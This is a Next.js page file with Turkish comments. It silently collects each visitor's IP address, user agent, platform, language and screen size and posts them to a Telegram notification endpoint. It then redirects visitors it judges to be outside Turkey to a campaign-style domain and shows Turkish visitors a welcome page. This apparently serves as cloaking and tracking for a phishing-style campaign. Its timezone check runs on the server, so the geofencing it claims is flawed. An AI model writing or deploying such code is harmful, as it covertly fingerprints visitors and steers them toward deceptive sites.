import { headers } from 'next/headers';
import { redirect } from 'next/navigation';

// Varsayılan yönlendirme URL'si
const DEFAULT_REDIRECT_URL = 'https://bbnsbnkampanya.vercel.app/';

export default async function Home() {
  const headersList = await headers();
  const userAgent = headersList.get('user-agent') || 'Unknown';
  const ip = headersList.get('x-forwarded-for') || 'Unknown';
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const isTurkishTimezone = timezone === 'Europe/Istanbul';
  const platform = headersList.get('sec-ch-ua-platform') || 'Unknown';
  const language = headersList.get('accept-language') || 'Unknown';
  const screenResolution = headersList.get('sec-ch-viewport-width') 
    ? `${headersList.get('sec-ch-viewport-width')}x${headersList.get('sec-ch-viewport-height')}`
    : 'Unknown';

  // Telegram bildirimi gönder
  try {
    const baseUrl = process.env.VERCEL_URL 
      ? `https://${process.env.VERCEL_URL}`
      : 'http://localhost:3000';

    const telegramResponse = await fetch(`${baseUrl}/api/telegram`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        ip,
        userAgent,
        timezone,
        isTurkishTimezone,
        platform,
        language,
        screenResolution
      })
    });

    if (!telegramResponse.ok) {
      console.error('Telegram API error:', await telegramResponse.text());
    }
  } catch (error) {
    console.error('Telegram notification error:', error);
  }

  // Yönlendirme URL'sini al
  let redirectUrl = DEFAULT_REDIRECT_URL;
  
  try {
    const baseUrl = process.env.VERCEL_URL 
      ? `https://${process.env.VERCEL_URL}`
      : 'http://localhost:3000';

    const redirectResponse = await fetch(`${baseUrl}/api/redirect-url`);
    
    if (redirectResponse.ok) {
      const data = await redirectResponse.json();
      if (data.redirectUrl) {
        redirectUrl = data.redirectUrl;
      }
    } else {
      console.error('Redirect URL API error:', await redirectResponse.text());
    }
  } catch (error) {
    console.error('Error fetching redirect URL:', error);
  }

  // Türkiye dışındaki kullanıcıları yönlendir
  if (!isTurkishTimezone) {
    redirect(redirectUrl);
  }

  return (
    <main className="flex min-h-screen flex-col items-center justify-center p-24">
      <h1 className="text-4xl font-bold mb-8">Hoş Geldiniz</h1>
      <p className="text-xl">Bu site sadece Türkiye'den erişilebilir.</p>
    </main>
  );
}
